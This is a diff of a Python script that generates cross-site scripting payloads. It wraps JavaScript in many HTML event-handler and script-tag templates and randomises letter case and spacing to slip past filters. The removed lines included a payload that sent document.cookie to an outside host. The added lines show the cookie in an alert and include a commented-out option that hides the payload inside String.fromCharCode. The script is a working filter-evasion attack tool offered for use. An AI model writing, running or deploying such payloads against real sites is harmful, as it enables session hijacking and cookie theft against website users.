@@ -6,31 +6,22 @@ def randomurl():
     return ''.join(choice(chars) for i in range(length))+'.com'
     
 def xssencode(javascript):
+    #javascript='eval(String.fromCharCode(%s))' % ','.join(str(ord(i)) for i in javascript)
     options=['<script>{}</script>',
-             '<a onmouseover="{}">link</a>',
-             '<IMG """><SCRIPT>{}</SCRIPT>">',
-             '<IMG SRC=# onmouseover="{}">',
-             '<IMG onmouseover="{}">',
-             '<IMG SRC=/ onerror="{}"></img>',
-             '<BODY ONLOAD={}>',
-             '<IFRAME SRC=# onmouseover="{}"></IFRAME>',
-             '<img src="%s/not.exist" onerror={}>' % randomurl()]
+             '<a onmouseover="{}">%s</a>' % (' '*random.randint(0, 500)),
+             '<dev onmouseover="{}">%s</dev>' % (' '*random.randint(0, 500)),
+             '<span onmouseover="{}">%s</span>' % (' '*random.randint(0, 500)),
+             '<img onmouseover="{}" src="#"/>',
+             '<img onmouseover="{}"/>',
+             '<img onerror="{}" src="/"/>',
+             '<img onerror="{}" src="%s"/>' % randomurl(),
+             '<iframe onmouseover="{}" src="#"></iframe>',
+             '<body onload={}>',]
     for i in options:
-        for a in [i.upper(), i.lower()]:
-            for b in [a.replace('>', ' >'), a]:
-                for c in [b.replace('<', '<<'), b]:
-                    yield c.format(javascript)
-##    yield '<script>%s</script>' % javascript
-##    yield '<script >%s</script>' % javascript
-##    yield '<<SCRIPT>%s//<</SCRIPT>' % javascript
-##    yield '<a onmouseover="%s">xxs link</a>' % javascript
-##    yield '<IMG """><SCRIPT>%s</SCRIPT>">' % javascript
-##    yield '''<IMG SRC=# onmouseover="%s">''' % javascript
-##    yield '''<IMG SRC= onmouseover="%s">''' % javascript
-##    yield '''<IMG onmouseover="%s">''' % javascript
-##    yield '<IMG SRC=/ onerror="%s"></img>' % javascript
-##    yield '<BODY ONLOAD=%s>' % javascript
-##    yield '<IFRAME SRC=# onmouseover="%s"></IFRAME>' % javascript
+        i=''.join(a.upper() if random.randint(0,1) else a.lower() for a in i)
+        i=''.join(a if random.randint(0,1) or a!='>' else ' >' for a in i)
+        i=''.join(a if random.randint(0,1) or a!=' ' else '  ' for a in i)
+        yield i.format(javascript)
 if __name__=='__main__':
-    attack="open('http://cc.com/?'+document.cookie)"
+    attack="alert('XSS: '+document.cookie)"
     print('\n'.join(xssencode(attack)))
